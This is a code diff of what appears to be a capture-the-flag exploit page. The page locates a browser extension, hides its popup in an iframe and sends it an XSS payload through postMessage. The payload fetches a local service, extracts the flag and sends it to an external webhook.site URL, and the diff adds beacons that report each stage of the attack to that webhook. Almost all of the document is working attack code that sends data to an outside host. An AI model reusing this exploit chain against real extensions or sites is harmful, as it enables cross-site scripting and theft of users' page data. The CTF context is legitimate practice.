@@ -8,13 +8,32 @@
         // Your webhook URL from webhook.site
         const WEBHOOK = "https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a";
         
+        // Test if the bot visits at all
+        fetch(WEBHOOK + '?test=visited&url=' + encodeURIComponent(window.location.href))
+            .catch(err => {
+                // If fetch fails, try with image tag as fallback
+                new Image().src = WEBHOOK + '?test=visited_img&url=' + encodeURIComponent(window.location.href);
+            });
+        
         setTimeout(() => {
             // Wait for the extension to replace the marquee with an image
             const img = document.querySelector('img[alt="STOP"]');
             if (img) {
+                // Report that extension is working
+                fetch(WEBHOOK + '?test=extension_working')
+                    .catch(err => {
+                        new Image().src = WEBHOOK + '?test=extension_working_img';
+                    });
+                
                 // Extract the extension ID dynamically from the image src
                 const extId = img.src.split('/')[2];
                 console.log('Found extension ID:', extId);
+                
+                // Report extension ID
+                fetch(WEBHOOK + '?test=extension_id&id=' + extId)
+                    .catch(err => {
+                        new Image().src = WEBHOOK + '?test=extension_id_img&id=' + extId;
+                    });
                 
                 // Create an iframe to the extension's popup page
                 const iframe = document.createElement('iframe');
@@ -22,8 +41,14 @@
                 iframe.style.display = 'none';
                 
                 iframe.onload = () => {
+                    // Report iframe loaded
+                    fetch(WEBHOOK + '?test=iframe_loaded')
+                        .catch(err => {
+                            new Image().src = WEBHOOK + '?test=iframe_loaded_img';
+                        });
+                    
                     // Set the replacement string to a payload that exfiltrates the flag
-                    const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(html=>{const m=html.match(/<marquee>([^<]+)<\\/marquee>/);if(m)fetch('${WEBHOOK}?flag='+encodeURIComponent(m[1]))})">`;
+                    const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(html=>{const m=html.match(/<marquee>([^<]+)<\\/marquee>/);if(m){fetch('${WEBHOOK}?flag='+encodeURIComponent(m[1]));new Image().src='${WEBHOOK}?img_flag='+encodeURIComponent(m[1])}})">`;
                     
                     // Send the payload to the extension via postMessage
                     iframe.contentWindow.postMessage({
@@ -31,14 +56,36 @@
                         replacementString: payload
                     }, "*");
                     
+                    // Report payload sent
+                    fetch(WEBHOOK + '?test=payload_sent')
+                        .catch(err => {
+                            new Image().src = WEBHOOK + '?test=payload_sent_img';
+                        });
+                    
                     // Redirect to localhost:1337 after a delay
                     setTimeout(() => {
+                        fetch(WEBHOOK + '?test=redirecting')
+                            .catch(err => {
+                                new Image().src = WEBHOOK + '?test=redirecting_img';
+                            });
                         window.location.href = 'http://localhost:1337';
                     }, 1000);
                 };
                 
+                iframe.onerror = () => {
+                    fetch(WEBHOOK + '?test=iframe_error')
+                        .catch(err => {
+                            new Image().src = WEBHOOK + '?test=iframe_error_img';
+                        });
+                };
+                
                 document.body.appendChild(iframe);
             } else {
+                // Report no extension image found
+                fetch(WEBHOOK + '?test=no_extension_image')
+                    .catch(err => {
+                        new Image().src = WEBHOOK + '?test=no_extension_image_img';
+                    });
                 console.log('No extension image found - extension may not have run.');
             }
         }, 2000);
